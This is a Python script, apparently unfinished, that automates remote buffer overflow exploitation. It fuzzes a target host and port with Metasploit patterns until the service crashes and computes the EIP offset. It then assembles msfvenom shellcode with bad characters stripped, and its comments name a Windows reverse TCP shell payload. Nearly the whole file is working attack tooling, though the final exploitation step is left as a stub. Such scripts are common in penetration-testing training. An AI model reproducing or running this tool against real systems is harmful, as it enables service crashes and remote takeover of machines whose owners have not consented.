#!/usr/bin/python3

# Goals:
# supply arguments ip and port
# automate remote buffer overflow exploits as much as possible

# substeps

# 2.
# find badchars
# generate offset byte array \x41
# fake EIP ABCD for easy recognition
# append fake payload array \x01 .. \xFF
# send and ask the user for badchar
# append badchars to list and resend until user confirms OK

# 3.
# generate payload with msfvenom
# ask the user to supply msfvenom arguments:
# payload, encoder, encrypt, iterations
# msfvenom returns 2 when failed
# msfvenom returns 0 when success
# msfvenom --payload windows/shell/reverse_tcp --list-options
# ask user for options
# msfvenom --payload <payload> -b'<badbytes>' -f raw <key=val key=val key=val>

# 4. ask user for jmp esp address
# 5. ask user to set up handler for payload
# 6. pwn target

# notes
# /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l <length> -q <pattern> 2> /dev/null
#     | grep 'Exact match' | head -n 1 | cut -d' ' -f 6



import argparse
import sys
import os
import socket
import time

def main():
	args = parse_args()
	print(args)
	print('='*79)
	target = (args.host, args.port)
	eip_offset = args.eip_offset
	# find EIP offset if not specified
	if eip_offset < 0:
		eip_offset = find_eip_offset(target, args)
	
	badbytes = args.badbytes
	
	while True:
		newBadByte = check_badbytes(target, badbytes, eip_offset, args)
		if newBadByte != None:
			if not newBadByte in badbytes:
				badbytes += newBadByte
			else:
				print(f'Bad character {newBadByte} already in {badbytes}.')
		else:
			print('Found all bad characters.')
			print(badbytes)
			break
	
	# generate buffer
	overflow = genPattern(eip_offset, args)
	payload = gen_payload(badbytes, args)
	buffer = args.prefix + overflow + payload
	padding = gen_padding(len(buffer) + len(args.postfix), badbytes, args)
	buffer = buffer + padding + args.postfix
	
	# ask user to start local handler
	
	
	# pwn target
	

def check_badbytes(target, badbytes, eip_offset, args):
	return None

def gen_padding(length_so_far, badbytes, args):
	return b''

def gen_payload(badbytes, args):
	# if file was specified, skip all the nonsense.
	if args.payload_file:
		return args.payload_file.read()
	
	platform = args.platform_name
	arch = args.arch_name
	payload_name = args.payload_name
	encoder = args.encoder_name
	nop_count = args.nops
	
	options = []
	
	msfvenom_cmd = args.msfvenom
	
	# add badbytes
	badbytes_str = str(badbytes)[1::]
	msfvenom_cmd += f' --bad-chars {badbytes_str}'
	
	# add output format raw
	msfvenom_cmd += f' --format hex'
	
	if not payload_name:
		# payload not specified
		# get user input on payload
		
		# platform
		if not args.platform_name:
			print('Platform not specified.')
			cmd = f'{msfvenom_cmd} --list platforms'
			print(cmd)
			print(os.popen(cmd).read())
			platform = input('Select platform.\nEmpty to not pass to msfvenom.\n> ').strip()
		
		if platform:
			msfvenom_cmd += f' --platform {platform}'
		else:
			print('No Platform selected.')
		
		# arch
		if not arch:
			print('Arch not specified.')
			cmd = f'{msfvenom_cmd} --list arch'
			print(cmd)
			print(os.popen(cmd).read())
			arch = input('Select arch.\nEmpty to not pass to msfvenom.\n> ').strip()
		
		if arch:
			msfvenom_cmd += f' --arch {arch}'
		else:
			print('No Arch selected.')
		
		# payload name
		print('Select payload.')
		cmd = f'{msfvenom_cmd} --list payloads'
		print(cmd)
		print(os.popen(cmd).read())
		while not payload_name:
			payload_name = input('Select payload.\nRequired\n> ').strip()
	
	msfvenom_cmd += f' --payload {payload_name}'
	if nop_count > 0:
		msfvenom_cmd += f' --nopsled {nop_count}'
	else:
		print('No NOP-sled')
	
	if not encoder:
		print('Encoder not defined')
		cmd = f'{msfvenom_cmd} --list encoders'
		print(cmd)
		print(os.popen(cmd).read())
		encoder = input('Select encoder.\nEmpty to not pass to msfvenom.\n> ').strip()
	
	if encoder:
		msfvenom_cmd += f' --encoder {encoder}'
	else:
		print('No encoder defined.')
	
	# options
	cmd = f'{msfvenom_cmd} --list-options'
	print(cmd)
	print(os.popen(cmd).read())	
	
	while True:
		key = input('Option KEY (empty for done)\n> ')
		if not key:
			break
		val = input('Option VALUE\n> ')
		options.append((key, val))
	
	# append to command
	for kvp in options:
		msfvenom_cmd += f' {kvp[0]}=\'{kvp[1]}\''
	
	
	print('Command done.')
	print(f'{msfvenom_cmd}')
	
	payload_hex = os.popen(msfvenom_cmd).read()
	
	print('-' * 20 + 'PAYLOAD HEX' + '-' * 20)
	print(payload_hex)
	print('-' * 20 + '    END    ' + '-' * 20)
	print('')
	payload = bytes.fromhex(payload_hex)
	print('-' * 20 + 'PAYLOAD' + '-' * 20)
	print(payload)
	print('-' * 20 + '  END  ' + '-' * 20)
	return payload
	

def find_eip_offset(target, args):
	pattern_length = 0
	print('Finding EIP offset.')
	inc = args.patterninc
	if inc <= 0:
		print(f'Pattern length increment {inc} invalid. Set to 1.')
		inc = 1
	# increment pattern length and send until network timeout
	while pattern_length < args.patternmax:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		pattern_length += inc
		print(f'Generating pattern with length {pattern_length} Bytes')
		pattern = genPattern(pattern_length, args)
		# connect and send
		try:
			print('Connecting...')
			s.connect(target)
			if args.banner:
				banner = s.recv(1024)
				length = len(banner)
				print(f'Got banner, {length} Bytes')
				print('-' * 12 + ' START ' + '-' * 12)
				print(banner)
				print('-' * 13 + ' END ' + '-' * 13)
			buffer = args.prefix + pattern + args.postfix
			length = len(buffer)
			print(f'Sending {length} Bytes.')
			print('-' * 12 + ' START ' + '-' * 12)
			print(buffer)
			print('-' * 13 + ' END ' + '-' * 13)
			s.send(buffer)
			print('Closing connection.')
			s.close()
			time.sleep(0.5)
			# check if crashed
			if crashcheck(target):
				print('Target not responding anymore.')
				eip = ""
				while len(eip) != 8:
					eip = input('EIP? (hex only, no 0x, no \\.)')
				offset = findPattern(pattern_length, eip, args)
					
				print(f'Offset found: {offset}')
				return offset
		except:
			print(sys.exc_info())
			exit(-1)
	return 0

def crashcheck(target):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(target)
		s.close()
	except:
		return True
	return False

def genPattern(pattern_length, args):
	pattern = os.popen(f'{args.pattern_generator} {args.pattern_generator_length_flag} {pattern_length}').read()
	# delete trailing newline
	pattern = pattern.strip()
	# encode into bytearray
	pattern = pattern.encode('raw_unicode_escape')
	return pattern

def findPattern(length, eip, args):
	print(f'EIP-LE: {eip}')
	# reverse, because intel is weird (little endian)
	eip = eip[6] + eip[7] + eip[4] + eip[5] + eip[2] + eip[3] + eip[0] + eip[1]
	print(f'EIP-BE: {eip}')
	pattern_found = bytes.fromhex(eip).decode('ascii')
	print(f'Pattern: "{pattern_found}"')
	
	# find pattern offset
	cmd = args.pattern_finder + ' ' + args.pattern_finder_length_flag + f' {length} ' + args.pattern_finder_query_flag + f' \'{pattern_found}\''
	print(cmd)
	cmd_output = os.popen(cmd).read()
	print(cmd_output)
	# sanitize cmd_output
	cmd_output.replace('\'', '<SingleQuote>')
	offset = -1
	print('Trying automatic response parse...')
	try:
		cmd = f'echo \'{cmd_output}\' | grep \'Exact match\' | head -n 1 | cut -d\' \' -f 6'
		print(cmd)
		offset = os.popen(cmd).read()
		offset = int(offset)
	except:
		print(sys.exc_info())
	
	if offset < 0:
		print('Failed to determine offset automatically.')
		offset = int(input('Enter offset manually.'))
	
	return offset

def parse_args():
	parser = argparse.ArgumentParser(description='Automate remote buffer overflows')
	# target
	parser.add_argument('--host', dest='host', help='Target IP', required=True)
	parser.add_argument('--port', dest='port', help='Target Port', required=True, type=int)
	parser.add_argument('--banner', dest='banner'
						, help='Grab banner first?', choices=['True', 'False']
						, default='True')
	# payload option
	parser.add_argument('--prefix', dest='prefix', help='Payload prefix', default='')
	parser.add_argument('--nops', dest='nops', help='NOOP-Sled length', default=16, type=int)
	parser.add_argument('--static-length', dest='static_length'
						, help="Keep payload length static with this many Bytes. Should be more than payload length otherwise. 0 to disable."
						, default=0, type=int)
	parser.add_argument('--padding', dest='padding'
						, choices=['NOP', 'NULL', 'xFF', 'RAND']
						, help='What is appended to the payload to get static size. Ignored if static_length is set to 0. RAND will not include bad bytes.'
						)
	parser.add_argument('--postfix', dest='postfix'
						, help="Appended to the end of the buffer.", default='')	
	# pattern finding
	# pattern gen
	parser.add_argument('--pattern-increment', dest='patterninc', help='Pattern increment steps', default=100, type=int)
	parser.add_argument('--pattern-max', dest='patternmax', help='Pattern max length', default=10000, type=int)
	parser.add_argument('--pattern-generator', dest='pattern_generator'
						, help='Path to pattern generator'
						, default='/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb'
						, type=ascii)
	parser.add_argument('--pattern-generator-length-flag', dest='pattern_generator_length_flag'
						, help = 'Flag for specifying the pattern length for generation.'
						, default = '-l')
	# pattern find
	parser.add_argument('--pattern-finder', dest='pattern_finder'
						, help='Path to pattern finder'
						, default='/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb')
	parser.add_argument('--pattern-finder-length-flag', dest='pattern_finder_length_flag'
						, help = 'Flag for specifying the pattern length for the finder.'
						, default = '-l')
	parser.add_argument('--pattern-finder-query-flag', dest='pattern_finder_query_flag'
						, help = 'Flag for specifying the pattern that was observed for the finder.'
						, default = '-q')	
	# crashing eip
	parser.add_argument('--bad-eip', dest='bad_eip',
						help='Pattern for EIP that crashes the program',
						default='\x44\x43\x42\x41')
	# predetermined options
	parser.add_argument('--eip-offset', dest='eip_offset'
						, help='Predetermined offset for EIP. -1 to find it.'
						, default = -1, type=int)
	# predeterminded badchars
	parser.add_argument('--bad-bytes', dest='badbytes', help='Known bad bytes. Ex. "\x00\x0A"', default='\\x00')
	# msfvenom
	parser.add_argument('--venom-path', dest='msfvenom', help='Path to msfvenom', default='/usr/bin/msfvenom')
	parser.add_argument('--payload-name', dest='payload_name', help='metasploit payload you want to use. If not set program will ask you.')
	parser.add_argument('--encoder-name', dest='encoder_name', help='metasploit encoder you want to use. If not set program will ask you.')
	parser.add_argument('--crypto-name', dest='crypto_name', help='metasploit crypto module you want to use. If not set program will ask you.')
	parser.add_argument('--arch-name', dest='arch_name', help='metasploit arch you want to use. If not set will use x86.', default='x86')
	parser.add_argument('--platform-name', dest='platform_name', help='Platform you want to attack. If not set program will ask you.')
	parser.add_argument('--encoding-iter', dest='encoding_iter', help='How many iterations of encoding to use.', type=int)
	parser.add_argument('--payload-file', dest='payload_file', help='File where the payload is stored in hex.', type=argparse.FileType('rb'))
	
	# parse arguments
	args = parser.parse_args()
	
	# fix types
	args.banner = (args.banner == 'True')
	
	# fix bytes arguments for prefix, postfix, bad_eip, badbytes
	args.prefix = string_to_bytes(args.prefix)
	args.postfix = string_to_bytes(args.postfix)
	args.bad_eip = string_to_bytes(args.bad_eip)
	args.badbytes = string_to_bytes(args.badbytes)
	return args

def string_to_bytes(string):
	result = b''
	i = 0
	while i < len(string):
		ch = string[i]
		if ch != '\\':
			result += ch.encode('raw_unicode_escape')
		else:
			# is a backslash. escape it.
			i += 1
			ch = string[i]
			if ch == '\\':
				result += b'\\'
			elif ch == 'n':
				result += b'\n'
			elif ch == '0':
				result += b'\0'
			elif ch == 'r':
				result += b'\r'
			elif ch == 'x':
				i += 1
				hi = string[i]
				i += 1
				lo = string[i]
				byte_hex = hi + lo
				result += bytes.fromhex(byte_hex)
			else:
				print(f'Unknown escape character "\\{ch}" at position {i} in "{string}".')
				exit(-1)
		i += 1
	return result

main()
